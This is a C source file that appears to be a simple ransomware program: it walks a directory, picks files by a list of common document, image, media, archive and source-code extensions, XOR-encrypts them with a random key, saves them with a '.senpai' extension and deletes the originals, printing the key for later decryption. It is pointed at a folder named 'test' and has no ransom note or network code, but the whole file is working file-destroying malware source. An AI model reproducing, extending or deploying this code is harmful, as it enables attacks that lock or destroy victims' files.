#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <dirent.h>
#include <sys/stat.h>
#include <stdbool.h>

#ifdef _WIN32
#include <windows.h>
#include <io.h>
#include <fcntl.h>
#define PATH_SEPARATOR '\\'
#else
#include <unistd.h>
#define PATH_SEPARATOR '/'
#endif

#define KEY_LENGTH 32

const char *extensions[] = {
    ".jpg",  ".txt",  ".png",  ".pdf",
    ".hwp",  ".psd",  ".cs",   ".c",
    ".cpp",  ".vb",   ".bas",  ".frm",
    ".mp3",  ".wav",  ".flac", ".gif",
    ".doc",  ".xls",  ".xlsx", ".docx",
    ".ppt",  ".pptx", ".js",   ".avi",
    ".mp4",  ".mkv",  ".zip",  ".rar",
    ".alz",  ".egg",  ".7z",   ".jpeg"
};
#define NUM_EXTENSIONS (sizeof(extensions) / sizeof(extensions[0]))

void xor_encrypt_decrypt(unsigned char *data, size_t data_len, unsigned char *key, size_t key_len);
unsigned char *generate_random_key(size_t length);
char *encode_key_base64(const unsigned char *key, size_t key_len);
unsigned char *decode_key_base64(const char *encoded_key, size_t *out_len);
void encrypt_file(const char *file_path, unsigned char *key);
void decrypt_file(const char *file_path, unsigned char *key);
void encrypt_directory(const char *directory, unsigned char *key);
void decrypt_directory(const char *directory, unsigned char *key);
void handle_error(const char *message);

bool has_allowed_extension(const char *filename) {
    for (size_t i = 0; i < NUM_EXTENSIONS; i++) {
        if (strstr(filename, extensions[i]) != NULL) {
            return true;
        }
    }
    return false;
}

void xor_encrypt_decrypt(unsigned char *data, size_t data_len, unsigned char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

unsigned char *generate_random_key(size_t length) {
    unsigned char *key = malloc(length);
    if (key == NULL) {
        handle_error("Failed to allocate memory for key");
    }
    if (RAND_bytes(key, length) != 1) {
        handle_error("Failed to generate random key");
    }
    return key;
}

char *encode_key_base64(const unsigned char *key, size_t key_len) {
    int encoded_len = 4 * ((key_len + 2) / 3);
    char *encoded_key = malloc(encoded_len + 1);
    if (encoded_key == NULL) {
        handle_error("Failed to allocate memory for Base64 encoded key");
    }
    EVP_EncodeBlock((unsigned char *)encoded_key, key, key_len);
    return encoded_key;
}

unsigned char *decode_key_base64(const char *encoded_key, size_t *out_len) {
    int decoded_len = strlen(encoded_key);
    unsigned char *decoded_key = malloc(decoded_len);
    if (decoded_key == NULL) {
        handle_error("Failed to allocate memory for decoded key");
    }
    *out_len = EVP_DecodeBlock(decoded_key, (const unsigned char *)encoded_key, decoded_len);
    return decoded_key;
}

void encrypt_file(const char *file_path, unsigned char *key) {
    FILE *file = fopen(file_path, "rb");
    if (!file) {
        handle_error("Failed to open file for encryption");
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *data = malloc(file_size);
    if (data == NULL) {
        handle_error("Failed to allocate memory for file data");
    }

    fread(data, 1, file_size, file);
    fclose(file);

    xor_encrypt_decrypt(data, file_size, key, KEY_LENGTH);

    char encrypted_file_path[1024];
    snprintf(encrypted_file_path, sizeof(encrypted_file_path), "%s.senpai", file_path);

    file = fopen(encrypted_file_path, "wb");
    if (!file) {
        handle_error("Failed to open file for writing encrypted data");
    }
    fwrite(data, 1, file_size, file);
    fclose(file);

    free(data);
    remove(file_path);
}

void decrypt_file(const char *file_path, unsigned char *key) {
    FILE *file = fopen(file_path, "rb");
    if (!file) {
        handle_error("Failed to open file for decryption");
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *data = malloc(file_size);
    if (data == NULL) {
        handle_error("Failed to allocate memory for file data");
    }

    fread(data, 1, file_size, file);
    fclose(file);

    xor_encrypt_decrypt(data, file_size, key, KEY_LENGTH);

    char decrypted_file_path[1024];
    snprintf(decrypted_file_path, sizeof(decrypted_file_path), "%s", file_path);
    decrypted_file_path[strlen(decrypted_file_path) - 7] = '\0';

    file = fopen(decrypted_file_path, "wb");
    if (!file) {
        handle_error("Failed to open file for writing decrypted data");
    }
    fwrite(data, 1, file_size, file);
    fclose(file);

    free(data);
    remove(file_path);
}

#ifdef _WIN32
void encrypt_directory(const char *directory, unsigned char *key) {
    WIN32_FIND_DATA find_file_data;
    HANDLE hFind = FindFirstFile(strcat(strdup(directory), "\\*"), &find_file_data);

    if (hFind == INVALID_HANDLE_VALUE) {
        handle_error("Failed to open directory");
    }

    do {
        if (!(find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char file_path[1024];
            snprintf(file_path, sizeof(file_path), "%s\\%s", directory, find_file_data.cFileName);

            if (has_allowed_extension(find_file_data.cFileName)) {
                encrypt_file(file_path, key);
            }
        }
    } while (FindNextFile(hFind, &find_file_data) != 0);

    FindClose(hFind);
}
#else
void encrypt_directory(const char *directory, unsigned char *key) {
    struct dirent *entry;
    DIR *dp = opendir(directory);

    if (dp == NULL) {
        handle_error("Failed to open directory");
    }

    while ((entry = readdir(dp))) {
        if (entry->d_type == DT_REG) {
            char file_path[1024];
            snprintf(file_path, sizeof(file_path), "%s/%s", directory, entry->d_name);

            if (has_allowed_extension(entry->d_name)) {
                encrypt_file(file_path, key);
            }
        }
    }

    closedir(dp);
}
#endif

#ifdef _WIN32
void decrypt_directory(const char *directory, unsigned char *key) {
    WIN32_FIND_DATA find_file_data;
    HANDLE hFind = FindFirstFile(strcat(strdup(directory), "\\*.senpai"), &find_file_data);

    if (hFind == INVALID_HANDLE_VALUE) {
        handle_error("Failed to open directory");
    }

    do {
        if (!(find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char file_path[1024];
            snprintf(file_path, sizeof(file_path), "%s\\%s", directory, find_file_data.cFileName);
            decrypt_file(file_path, key);
        }
    } while (FindNextFile(hFind, &find_file_data) != 0);

    FindClose(hFind);
}
#else
void decrypt_directory(const char *directory, unsigned char *key) {
    struct dirent *entry;
    DIR *dp = opendir(directory);

    if (dp == NULL) {
        handle_error("Failed to open directory");
    }

    while ((entry = readdir(dp))) {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".senpai")) {
            char file_path[1024];
            snprintf(file_path, sizeof(file_path), "%s/%s", directory, entry->d_name);
            decrypt_file(file_path, key);
        }
    }

    closedir(dp);
}
#endif

void handle_error(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[]) {
    const char *directory = "test";

    if (argc == 1) {
        unsigned char *key = generate_random_key(KEY_LENGTH);
        char *encoded_key = encode_key_base64(key, KEY_LENGTH);
        printf("Base64 Encoded Key: %s\n", encoded_key);
        encrypt_directory(directory, key);

        free(key);
        free(encoded_key);
    } else if (argc == 2) {
        size_t key_len;
        unsigned char *key = decode_key_base64(argv[1], &key_len);
        decrypt_directory(directory, key);

        free(key);
    }

    return EXIT_SUCCESS;
}
